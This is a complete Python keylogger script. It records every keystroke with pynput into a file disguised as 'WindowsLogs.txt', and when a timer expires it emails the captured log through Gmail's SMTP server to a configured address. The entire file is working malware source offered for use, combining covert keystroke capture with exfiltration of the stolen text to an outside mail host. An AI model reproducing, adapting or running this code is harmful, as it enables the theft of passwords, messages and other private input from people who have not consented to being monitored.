import logging
from pynput import keyboard
from datetime import datetime, timedelta
import smtplib
from email.message import EmailMessage
import threading
import os

#CONFIGURATION

# How long the keylogger should run (in minutes)
DURATION_MINUTES = 1

# Enable/disable email sending
SEND_EMAIL = True

# Email credentials
EMAIL_ADDRESS = 'your_email@gmail.com'         # Use your Gmail
EMAIL_PASSWORD = 'your_generated_app_password' # App password (not your real password)
RECEIVER_EMAIL = 'your_email@gmail.com'        # Receiver email (can be same)

# Save log in the same folder as the script
log_file = os.path.join(os.getcwd(), "WindowsLogs.txt")

# Initialize logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# TIME LIMIT
start_time = datetime.now()
end_time = start_time + timedelta(minutes=DURATION_MINUTES)

#KEYLOGGER FUNCTION
def on_key_press(key):
    if datetime.now() > end_time:
        print("[*] Logging time over. Stopping keylogger.")
        return False

    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
      
#SEND LOGS VIA EMAIL
def send_log_email(file_path):
    try:
        with open(file_path, 'r') as f:
            log_content = f.read()
    except Exception as e:
        print(f"[!] Could not read log file: {e}")
        return

    msg = EmailMessage()
    msg['Subject'] = 'Keylogger Report'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECEIVER_EMAIL
    msg.set_content(f"Here is the recorded keylog data:\n\n{log_content}")

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
            print("[+] Log file emailed successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

#MAIN FUNCTION
def start_logger():
    print(f"[*] Keylogger started for {DURATION_MINUTES} minute(s)...")

    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

    if SEND_EMAIL:
        send_log_email(log_file)

if __name__ == "__main__":
    # Running keylogger in a separate thread
    logger_thread = threading.Thread(target=start_logger)
    logger_thread.start()
